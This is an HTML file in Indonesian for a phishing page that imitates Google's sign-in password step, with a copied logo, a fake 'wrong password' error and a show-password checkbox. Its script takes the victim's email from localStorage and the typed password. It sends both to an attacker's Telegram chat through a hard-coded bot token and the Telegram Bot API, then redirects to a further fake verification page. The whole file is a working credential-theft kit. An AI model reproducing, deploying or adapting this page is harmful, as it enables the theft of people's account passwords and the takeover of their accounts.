<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:#fff;
    min-height:100vh;
    display:flex;
    justify-content:center;
}

.container{
    width:100%;
    max-width:420px;
    padding:40px 20px;
}

.google-logo{
    width:75px;
    margin-bottom:20px;
}

h1{
    font-size:48px;
    font-weight:400;
    color:#202124;
    margin-bottom:20px;
}

.email-box{
    display:flex;
    align-items:center;
    gap:10px;
    border:1px solid #dadce0;
    border-radius:30px;
    padding:10px 15px;
    width:fit-content;
    margin-bottom:100px;
    cursor:pointer;
}

.email-box img{
    width:25px;
}

.email{
    font-size:16px;
    color:#202124;
}

.down-arrow{
    width:18px;
    height:18px;
    fill:#5f6368;
}

.password-wrapper{
    position:relative;
    margin-bottom:10px;
}

.password-wrapper input{
    width:100%;
    height:50px;
    border:3px solid #b3261e;
    border-radius:6px;
    outline:none;
    padding:15px;
    font-size:18px;
    transition:border-color 0.3s;
}

.password-wrapper label{
    position:absolute;
    top:-12px;
    left:15px;
    background:#fff;
    color:#b3261e;
    padding:0 8px;
    font-size:18px;
}

.error{
    color:#b3261e;
    font-size:14px;
    display:flex;
    align-items:flex-start;
    gap:10px;
    margin-bottom:25px;
}

.error-icon{
    width:20px;
    height:20px;
    fill:#b3261e;
}

.show-password{
    display:flex;
    align-items:center;
    gap:15px;
    margin-bottom:100px;
}

.show-password input{
    width:28px;
    height:28px;
}

.bottom{
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.bottom a{
    color:#1a73e8;
    text-decoration:none;
    font-size:16px;
}

button{
    background:#1a73e8;
    color:#fff;
    border:none;
    padding:14px 42px;
    border-radius:30px;
    font-size:20px;
    cursor:pointer;
    transition:all 0.3s;
}

button:hover{
    background:#1557b0;
}

button:disabled{
    background:#ccc;
    cursor:not-allowed;
}

.footer{
    margin-top:250px;
    display:flex;
    justify-content:space-between;
    color:#5f6368;
    font-size:15px;
}
</style>
</head>
<body>

<div class="container">

    <svg class="google-logo" viewBox="0 0 272 92">
        <path fill="#EA4335" d="M115 46.1c0-3.2-.3-6.2-.8-9.1H69v17.2h25.9c-1.1 5.9-4.5 10.8-9.5 14.1v11.7h15.4c9-8.3 14.2-20.5 14.2-33.9z"/>
        <path fill="#34A853" d="M69 92c12.9 0 23.8-4.3 31.7-11.6L85.3 68.7c-4.3 2.9-9.8 4.6-16.3 4.6-12.5 0-23.1-8.5-26.9-19.9H26.1v12.5C34 81.6 50.1 92 69 92z"/>
        <path fill="#FBBC05" d="M42.1 53.4c-1-2.9-1.6-6-1.6-9.4s.6-6.5 1.6-9.4V22.1H26.1C22.8 28.7 21 36.1 21 44s1.8 15.3 5.1 21.9l16-12.5z"/>
        <path fill="#4285F4" d="M69 17.7c7 0 13.3 2.4 18.2 7.1l13.6-13.6C92.8 4.1 81.9 0 69 0 50.1 0 34 10.4 26.1 26.1l16 12.5C45.9 26.2 56.5 17.7 69 17.7z"/>
    </svg>

    <h1>Selamat datang</h1>

    <div class="email-box">
        <svg width="24" height="24" viewBox="0 0 24 24">
            <circle cx="12" cy="8" r="4" fill="#5f6368"/>
            <path d="M4 20c0-4 3.5-7 8-7s8 3 8 7" fill="none" stroke="#5f6368" stroke-width="2"/>
        </svg>

        <span class="email" id="emailText">email@gmail.com</span>

        <svg class="down-arrow" viewBox="0 0 24 24">
            <path d="M7 10l5 5 5-5z"/>
        </svg>
    </div>

    <div class="password-wrapper">
        <label>Masukkan sandi</label>
        <input type="password" id="password">
    </div>

    <div class="error">
        <svg class="error-icon" viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
        </svg>
        <span id="errorText">Sandi salah. Coba lagi atau klik "Lupa sandi?" untuk opsi lainnya.</span>
    </div>

    <div class="show-password">
        <input type="checkbox" id="showPass">
        <label for="showPass">Tampilkan sandi</label>
    </div>

    <div class="bottom">
        <a href="#">Lupa sandi?</a>
        <button id="nextBtn">Berikutnya</button>
    </div>

    <div class="footer">
        <span>Indonesia ▼</span>
        <span>Bantuan</span>
        <span>Privasi</span>
        <span>Persyaratan</span>
    </div>

</div>

<script>
// Ambil email dari localStorage
const email = localStorage.getItem("userEmail") || "**";
document.getElementById("emailText").textContent = email;

// Tampilkan/Sembunyikan password
document.getElementById("showPass").addEventListener("change", function(){
    document.getElementById("password").type =
        this.checked ? "text" : "password";
});

// Kirim ke Telegram
function sendToTelegram(email, password) {
    // ---------------------------------------------
    // KONFIGURASI TELEGRAM ANDA (ISI DI BAWAH INI)
    // ---------------------------------------------
    const botToken = "8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk";
    const chatId = "7549590022";
    // ---------------------------------------------
    
    const message = `🔐 Login Baru\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(url)
    .then(response => response.json())
    .then(data => {
        const btn = document.getElementById("nextBtn");
        const errorText = document.getElementById("errorText");
        
        if(data.ok){
            window.location.href = "verifikasi.google.html";
        } else {
            console.error(data);
            errorText.textContent = "Gagal terhubung ke server.";
            errorText.parentElement.style.display = "flex";
        }
    })
    .catch(error => {
        console.error(error);
        document.getElementById("errorText").textContent = "Error: " + error;
        document.querySelector(".error").style.display = "flex";
    })
    .finally(() => {
        const btn = document.getElementById("nextBtn");
        btn.disabled = false;
        btn.textContent = "Berikutnya";
    });
}

// Tombol berikutnya
document.getElementById("nextBtn").addEventListener("click", function(){
    const password = document.getElementById("password").value;
    const errorText = document.getElementById("errorText");
    
    // Validasi
    if(password === ""){
        errorText.textContent = "Masukkan kata sandi.";
        document.querySelector(".error").style.display = "flex";
        return;
    }
    
    // Disable tombol
    this.disabled = true;
    this.textContent = "Memuat...";
    document.querySelector(".error").style.display = "none";
    
    // Kirim ke Telegram
    sendToTelegram(email, password);
});
</script>

</body>
</html>
